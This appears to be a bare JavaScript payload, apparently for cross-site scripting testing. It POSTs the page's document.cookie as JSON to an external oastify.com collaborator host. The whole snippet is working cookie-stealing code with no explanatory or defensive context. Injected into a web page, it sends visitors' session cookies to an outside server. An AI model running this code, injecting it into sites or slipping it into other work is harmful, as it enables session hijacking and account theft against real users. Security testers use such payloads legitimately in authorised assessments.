var xhr = new XMLHttpRequest();
xhr.open("POST", "http://lf4sbn2c040tsuk2viki16opagg747sw.oastify.com/a", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({ data: document.cookie }));